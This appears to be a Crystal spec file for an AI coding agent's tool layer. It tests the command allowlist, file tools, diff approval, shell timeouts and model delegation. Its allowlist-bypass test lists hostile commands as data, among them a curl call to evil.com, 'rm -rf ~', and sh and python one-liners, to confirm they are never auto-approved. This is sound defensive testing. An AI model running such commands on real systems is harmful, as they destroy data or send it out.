@@ -1,0 +1,263 @@
+# spec/tools_spec.cr
+require "./spec_helper"
+
+describe "Nightmare Tools Suite & Security Boundaries" do
+  describe "allowlist bypass corpus (T8)" do
+    it "forces interactive modal or fails tokenization for all injection patterns" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        allowlist = Nightmare::Tools::Allowlist.new
+
+        # User has allowed "git status" and "crystal spec"
+        allowlist.allow_session_prefix(["git", "status"])
+        allowlist.allow_session_prefix(["crystal", "spec"])
+        allowlist.allow_session_prefix(["ls"])
+
+        # Base case: genuine "git status" is auto-approvable
+        argv_clean = Nightmare::Tools::Allowlist.tokenize("git status")
+        allowlist.auto_approvable?("git status", argv_clean).should be_true
+
+        bypass_attempts = [
+          "git -c core.sshCommand=malicious status",
+          "git --exec-path=/tmp status",
+          "find . -exec sh -c 'whoami' \\;",
+          "xargs rm -rf",
+          "env FOO=1 sh",
+          "python -c 'import os; os.system(\"id\")'",
+          "FOO=$(id) git status",
+          "git status; rm -rf ~",
+          "git status && curl http://evil.com",
+          "git status | grep foo",
+          "git status > /tmp/out",
+          "git status `id`",
+          "git status\nrm -rf .",
+        ]
+
+        bypass_attempts.each do |cmd|
+          failed_tokenization = false
+          argv = begin
+            Nightmare::Tools::Allowlist.tokenize(cmd)
+          rescue
+            failed_tokenization = true
+            [] of String
+          end
+
+          # If it succeeded tokenization, it MUST NOT auto-approve!
+          unless failed_tokenization
+            is_auto = allowlist.auto_approvable?(cmd, argv)
+            is_auto.should be_false, "Bypass command '#{cmd}' unexpectedly auto-approved!"
+          end
+        end
+      end
+    end
+  end
+
+  describe "read-only tools" do
+    it "lists files excluding git, nightmare, and sensitive files" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        tools = Nightmare::Tools::ReadOnly.new(guard)
+
+        # Create sample workspace
+        File.write(File.join(root, "app.cr"), "puts 'app'")
+        File.write(File.join(root, ".env"), "SECRET=1")
+        Dir.mkdir_p(File.join(root, ".git"))
+        File.write(File.join(root, ".git", "config"), "git")
+        Dir.mkdir_p(File.join(root, ".nightmare"))
+        File.write(File.join(root, ".nightmare", "prompt.md"), "prompt")
+
+        output = tools.list_files
+        output.should contain("app.cr")
+        output.should_not contain(".env")
+        output.should_not contain(".git")
+        output.should_not contain(".nightmare")
+      end
+    end
+
+    it "searches file contents with pattern matching" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        tools = Nightmare::Tools::ReadOnly.new(guard)
+
+        File.write(File.join(root, "foo.txt"), "hello world\nneedle here\ngoodbye")
+        File.write(File.join(root, "bar.txt"), "nothing special")
+
+        result = tools.search("needle")
+        result.should contain("foo.txt:2: needle here")
+        result.should_not contain("bar.txt")
+      end
+    end
+
+    it "reads file lines with offset and limit" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        tools = Nightmare::Tools::ReadOnly.new(guard)
+
+        File.write(File.join(root, "lines.txt"), "one\ntwo\nthree\nfour\nfive")
+
+        result = tools.read_file("lines.txt", offset: 2, limit: 2)
+        result.should contain("2 | two")
+        result.should contain("3 | three")
+        result.should_not contain("1 | one")
+        result.should_not contain("4 | four")
+      end
+    end
+
+    it "returns file metadata via file_info" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        tools = Nightmare::Tools::ReadOnly.new(guard)
+
+        File.write(File.join(root, "info.txt"), "abc\ndef\n")
+        json_str = tools.file_info("info.txt")
+        json = JSON.parse(json_str)
+
+        json["path"].as_s.should eq("info.txt")
+        json["directory"].as_bool.should be_false
+        json["lines"].as_i.should eq(2)
+      end
+    end
+  end
+
+  describe "mutation tools and diff approval" do
+    it "auto-approves creation of a new file without prompt" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        effects = [] of String
+        mutation = Nightmare::Tools::Mutation.new(guard)
+        mutation.active_side_effects = effects
+
+        res = mutation.write_file("new_file.txt", "Hello new file")
+        res.should contain("Successfully wrote")
+        File.read(File.join(root, "new_file.txt")).should eq("Hello new file")
+        effects.should contain("new_file.txt")
+      end
+    end
+
+    it "requires diff approval before overwriting an existing file" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        file_path = File.join(root, "existing.txt")
+        File.write(file_path, "Original line\n")
+
+        # Approval handler rejecting mutation
+        approved = false
+        received_diff = ""
+        handler = ->(diff : String, desc : String) {
+          received_diff = diff
+          approved
+        }
+
+        mutation = Nightmare::Tools::Mutation.new(guard, handler)
+
+        # First try: rejected
+        res = mutation.write_file("existing.txt", "Overwritten line\n")
+        res.should eq("[Execution rejected by user]")
+        File.read(file_path).should eq("Original line\n")
+        received_diff.should contain("-Original line")
+        received_diff.should contain("+Overwritten line")
+
+        # Second try: approved
+        approved = true
+        res2 = mutation.write_file("existing.txt", "Overwritten line\n")
+        res2.should contain("Successfully wrote")
+        File.read(file_path).should eq("Overwritten line\n")
+      end
+    end
+
+    it "replaces unique target string in file with diff approval" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        file_path = File.join(root, "code.cr")
+        File.write(file_path, "def run\n  old_code\nend\n")
+
+        handler = ->(_diff : String, _desc : String) { true }
+        mutation = Nightmare::Tools::Mutation.new(guard, handler)
+
+        res = mutation.replace_in_file("code.cr", "old_code", "new_code")
+        res.should contain("Successfully replaced")
+        File.read(file_path).should eq("def run\n  new_code\nend\n")
+      end
+    end
+  end
+
+  describe "shell execution and process group supervision" do
+    it "terminates command on timeout via process group (T9)" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        allowlist = Nightmare::Tools::Allowlist.new
+
+        # Approve sleep
+        allowlist.allow_session_prefix(["sleep"])
+
+        shell = Nightmare::Tools::Shell.new(guard, allowlist)
+
+        # Timeout after 1 second for a 10s sleep
+        start_time = Time.monotonic
+        result = shell.run_command("sleep 10", timeout_seconds: 1)
+        elapsed = Time.monotonic - start_time
+
+        result.should contain("[Execution timed out after 1 seconds]")
+        elapsed.total_seconds.should be < 5.0
+      end
+    end
+
+    it "does not deadlock when draining large output on both pipes (T10)" do
+      with_temp_dir do |root|
+        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
+        guard = Nightmare::Tools::Guard.new(env)
+        allowlist = Nightmare::Tools::Allowlist.new
+
+        # Python command writing > 70KB to stdout and stderr
+        allowlist.allow_session_prefix(["python3"])
+        script_file = File.join(root, "chatty.py")
+        File.write(script_file, <<-PY
+import sys
+data = "A" * 70000
+sys.stdout.write(data)
+sys.stdout.flush()
+sys.stderr.write(data)
+sys.stderr.flush()
+PY
+        )
+
+        shell = Nightmare::Tools::Shell.new(guard, allowlist)
+        result = shell.run_command("python3 chatty.py", timeout_seconds: 5)
+
+        # Finished without deadlocking, capped output
+        result.should contain("[... stream truncated at")
+        result.should contain("STDERR:")
+      end
+    end
+  end
+
+  describe "model delegation (ask_model)" do
+    it "returns isolated model response without crashing primary turn" do
+      client = FakeClient.new([
+        Mantle::Clients::Response.new(content: "Delegated model answer", tool_calls: nil)
+      ])
+      delegation = Nightmare::Tools::Delegation.new(client)
+
+      answer = delegation.ask_model("What is the capital of France?")
+      answer.should eq("Delegated model answer")
+    end
+
+    it "encapsulates model errors into result string" do
+      client = FakeClient.new
+      client.raise_on_call[1] = Exception.new("Connection refused")
+
+      delegation = Nightmare::Tools::Delegation.new(client)
+      answer = delegation.ask_model("Query")
+      answer.should contain("[Model delegation error: ClientFailure]")
+    end
+  end
+end
